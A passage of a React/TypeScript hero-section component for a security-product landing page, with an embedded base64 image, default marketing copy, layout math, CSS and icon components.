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";

const DEFAULTS = {
  src: HERO_LIGHT_SRC,
  darkSrc: HERO_DARK_SRC,
  mobileSrc: HERO_LIGHT_SRC,
  mobileDarkSrc: HERO_DARK_SRC,
  imageAlt: "3D metallic cybernetic shield and interwoven cryptographic lattice sculpture",
  brand: "AegisSec®",
  navLinks: [
    { label: "Live Scanner", href: "#scanner" },
    { label: "Threat Matrix", href: "#threat-telemetry" },
    { label: "Architecture", href: "#architecture" },
    { label: "Compliance", href: "#compliance" },
    { label: "Protection Tiers", href: "#pricing" },
  ],
  navCta: { label: "Deploy Shield", href: "#scanner" },
  eyebrow: "Autonomous Web & API Defense — Zero-Trust eBPF Mesh",
  headline: "Defense that\nstrikes back.",
  headlineAccent: "strikes back.",
  body: "Neutralize zero-day exploits, automated L7 botnets, and shadow API breaches before payloads reach your origin — powered by sub-millisecond edge telemetry and self-healing cryptographic rules.",
  primaryCta: { label: "Scan Your Domain", href: "#scanner" },
  secondaryCta: { label: "Inspect Live Telemetry", href: "#threat-telemetry" },
  hint: "Sweep cursor to disrupt the cryptographic shield",
  hintTouch: "Touch to disrupt the cryptographic shield",
  background: "#D9D5CC",
  darkBackground: "#04090F",
  textColor: "#0F172A",
  accentColor: "#38BDF8",
  headingFont: "'Geist', 'Inter', 'Helvetica Neue', Arial, sans-serif",
  accentFont: "'Instrument Serif', Georgia, serif",
  bodyFont: "'Geist', 'Inter', 'Helvetica Neue', Arial, sans-serif",
};

function computeRect(
  w: number,
  h: number,
  aspect: number,
  band: { top: number; bottom: number },
  p: { scale: number; mobileScale: number; x: number; y: number }
): Rect {
  const bandH = Math.max(80, band.bottom - band.top);
  let rw: number;
  let maxH: number;
  if (w >= 1024) {
    rw = w * 0.92 * p.scale;
    maxH = bandH * 1.18 * p.scale;
  } else if (w >= 640) {
    rw = w * 1.15 * p.scale;
    maxH = bandH * 1.15 * p.scale;
  } else if (aspect < 1.3) {
    rw = w * 1.0 * p.mobileScale;
    maxH = bandH * 1.0 * p.mobileScale;
  } else {
    rw = w * 1.45 * p.mobileScale;
    maxH = bandH * 1.15 * p.mobileScale;
  }
  if (rw / aspect > maxH) rw = maxH * aspect;
  const rh = rw / aspect;
  const cx = w * (0.5 + p.x / 100);
  const cy = (band.top + band.bottom) / 2 + h * (p.y / 100);
  return { x: cx - rw / 2, y: cy - rh / 2, w: rw, h: rh };
}

const CSS = `
.sh-root{position:relative;width:100%;height:var(--sh-h);overflow:hidden;isolation:isolate;container-type:size;transition:background-color .6s ease,color .6s ease;
  background:var(--sh-bg);color:var(--sh-fg);font-family:var(--sh-body);-webkit-font-smoothing:antialiased;
  touch-action:pan-y;display:flex;flex-direction:column;box-sizing:border-box}
.sh-root *,.sh-root *::before,.sh-root *::after{box-sizing:border-box}
.sh-stage{position:absolute;inset:0;z-index:0;pointer-events:none}
.sh-canvas{position:absolute;inset:0;width:100%;height:100%;display:block;opacity:0;transition:opacity .5s ease}
.sh-fallback{position:absolute;display:block;max-width:none;user-select:none;-webkit-user-drag:none;transition:opacity .5s ease}
.sh-root[data-gl="on"] .sh-canvas{opacity:1}
.sh-root[data-gl="on"] .sh-fallback{opacity:0}
.sh-root[data-swap="1"] .sh-canvas{opacity:0;transition-duration:.25s}
.sh-root[data-swap="1"] .sh-fallback{opacity:0;transition-duration:.25s}
.sh-backdrop{position:absolute;left:50%;z-index:0;transform:translate(-50%,-50%);white-space:nowrap;pointer-events:none;user-select:none;
  font-family:var(--sh-head);font-weight:700;letter-spacing:-.06em;line-height:.8;color:color-mix(in srgb,var(--sh-fg) 5%,transparent)}
.sh-nav{position:relative;z-index:2;display:flex;align-items:center;justify-content:space-between;gap:24px;
  padding:24px clamp(20px,3.2cqw,48px) 0}
.sh-brand{font-family:var(--sh-head);font-weight:700;font-size:18px;letter-spacing:-.02em;color:inherit;text-decoration:none;display:inline-flex;align-items:center;gap:10px}
.sh-links{display:flex;align-items:center;gap:clamp(16px,2.2cqw,32px);list-style:none;margin:0;padding:0}
.sh-link{color:inherit;text-decoration:none;font-size:13.5px;letter-spacing:-.005em;opacity:.75;transition:opacity .2s}
.sh-link:hover{opacity:1}
.sh-theme{display:inline-grid;place-items:center;width:36px;height:36px;padding:0;border-radius:50%;cursor:pointer;color:inherit;background:transparent;
  border:1px solid color-mix(in srgb,var(--sh-fg) 22%,transparent);transition:background .25s,color .25s}
.sh-theme:hover{background:var(--sh-fg);color:var(--sh-bg)}
.sh-theme:focus-visible{outline:2px solid var(--sh-fg);outline-offset:4px}
.sh-navcta{color:inherit;text-decoration:none;font-size:13.5px;font-weight:500;padding:8px 16px;border:1px solid color-mix(in srgb,var(--sh-fg) 26%,transparent);
  border-radius:999px;transition:background .25s,color .25s}
.sh-navcta:hover{background:var(--sh-fg);color:var(--sh-bg)}
.sh-hint{position:absolute;z-index:1;transform:translate(-50%,0);display:flex;align-items:center;gap:10px;white-space:nowrap;
  font-size:11px;letter-spacing:.14em;text-transform:uppercase;opacity:.58;pointer-events:none;transition:opacity .8s ease}
.sh-hint::before{content:"";width:6px;height:6px;border-radius:50%;background:var(--sh-acc);animation:sh-pulse 2.4s ease-in-out infinite}
.sh-root[data-touched="1"] .sh-hint{opacity:0}
@keyframes sh-pulse{0%,100%{transform:scale(.6);opacity:.45}50%{transform:scale(1);opacity:1}}
.sh-spacer{flex:1 1 auto;min-height:0}
.sh-content{position:relative;z-index:2;display:grid;grid-template-columns:minmax(0,1.65fr) minmax(0,1fr);align-items:end;
  gap:clamp(24px,4cqw,72px);padding:0 clamp(20px,3.2cqw,48px) clamp(28px,3.4cqw,52px)}
.sh-eyebrow{font-size:12px;letter-spacing:.12em;text-transform:uppercase;opacity:.75;margin:0 0 clamp(14px,1.6cqw,22px);
  display:flex;align-items:center;gap:12px;color:var(--sh-acc);font-weight:600}
.sh-eyebrow::before{content:"";width:28px;height:1.5px;background:currentColor;opacity:.85}
.sh-h1{font-family:var(--sh-head);font-weight:600;font-size:clamp(38px,min(6.4cqw,11cqh),116px);line-height:.92;letter-spacing:-.045em;margin:0;
  text-wrap:balance}
.sh-h1 .sh-line{display:block}
.sh-accent{font-family:var(--sh-accent);font-style:italic;font-weight:400;letter-spacing:-.02em;color:var(--sh-acc)}
.sh-aside{max-width:430px;justify-self:end;padding-bottom:.4em}
.sh-body{font-size:clamp(14.5px,1.05cqw,16.5px);line-height:1.55;letter-spacing:-.01em;margin:0 0 24px;opacity:.82;text-wrap:pretty}
.sh-ctas{display:flex;flex-wrap:wrap;align-items:center;gap:20px}
.sh-btn{display:inline-flex;align-items:center;gap:10px;height:46px;padding:0 22px;border-radius:999px;background:var(--sh-acc);
  color:#04090F;text-decoration:none;font-size:14.5px;font-weight:600;letter-spacing:-.01em;transition:transform .3s cubic-bezier(.2,.7,.2,1),opacity .2s}
.sh-btn:hover{transform:translateY(-1px);opacity:.94}
.sh-btn svg,.sh-txt svg{transition:transform .3s cubic-bezier(.2,.7,.2,1)}
.sh-btn:hover svg,.sh-txt:hover svg{transform:translateX(3px)}
.sh-txt{display:inline-flex;align-items:center;gap:8px;color:inherit;text-decoration:none;font-size:14.5px;font-weight:500;
  letter-spacing:-.01em;padding:4px 0;border-bottom:1px solid color-mix(in srgb,var(--sh-fg) 30%,transparent)}
.sh-root a:focus-visible{outline:2px solid var(--sh-fg);outline-offset:4px}
@container (max-width:1023px){
  .sh-content{grid-template-columns:1fr;gap:24px}
  .sh-aside{justify-self:start;max-width:540px;padding-bottom:0}
  .sh-h1{font-size:clamp(36px,min(9cqw,8.8cqh),88px)}
}
@container (max-width:767px){
  .sh-links li:not(.sh-keep){display:none}
}
@container (max-width:639px){
  .sh-nav{padding-top:18px}
  .sh-h1{font-size:clamp(34px,min(11.5cqw,7cqh),56px);line-height:.94}
  .sh-body{font-size:14.5px;margin-bottom:18px}
  .sh-eyebrow{font-size:10.5px}
  .sh-ctas{gap:16px}
  .sh-btn{height:44px}
  .sh-content{padding-bottom:34px}
}
@media (prefers-reduced-motion:reduce){
  .sh-hint::before{animation:none}
  .sh-canvas,.sh-fallback,.sh-btn,.sh-btn svg,.sh-txt svg{transition:none}
}
`;

const SunIcon = () => (
  <svg width="15" height="15" viewBox="0 0 16 16" fill="none" aria-hidden="true">
    <circle cx="8" cy="8" r="3.2" stroke="currentColor" strokeWidth="1.3" />
    <path
      d="M8 1.2v1.6M8 13.2v1.6M1.2 8h1.6M13.2 8h1.6M3.2 3.2l1.1 1.1M11.7 11.7l1.1 1.1M3.2 12.8l1.1-1.1M11.7 4.3l1.1-1.1"
      stroke="currentColor"
      strokeWidth="1.3"
      strokeLinecap="round"
    />
  </svg>
);

const MoonIcon = () => (
  <svg width="15" height="15" viewBox="0 0 16 16" fill="none" aria-hidden="true">
    <path
      d="M13.6 10.1A5.9 5.9 0 0 1 5.9 2.4a5.9 5.9 0 1 0 7.7 7.7Z"
      stroke="currentColor"
      strokeWidth="1.3"
      strokeLinejoin="round"
    />
  </svg>
);

const Arrow = () => (
  <svg width="14" height="14" viewBox="0 0 14 14" fill="none" aria-hidden="true">
    <path d="M2 7h10M8 3l4 4-4 4" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round" />
  </svg>
);

let fontsInjected = false;
function injectFonts() {
  if (fontsInjected || typeof document === "undefined") return;
  fontsInjected = true;
  const id = "sh-fonts";
  if (document.getElementById(id)) return;
  const l = document.createElement("link");
  l.id = id;
  l.rel = "stylesheet";
  l.href =
    "https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600;700&family=Instrument+Serif:ital@0;1&display=swap";
  document.head.appendChild(l);
}

function renderHeadline(text: string, accent: string) {
  const lines = text.split("\n");
  return lines.map((line, li) => {
    let content: React.ReactNode = line;
    const a = accent && accent.trim();
    if (a) {
      const idx = line.indexOf(a);
      if (idx >= 0) {
        content = (
          <>
            {line.slice(0, idx)}
            <span className="sh-accent">{a}</span>
            {line.slice(idx + a.length)}
          </>
        );
      }
    }
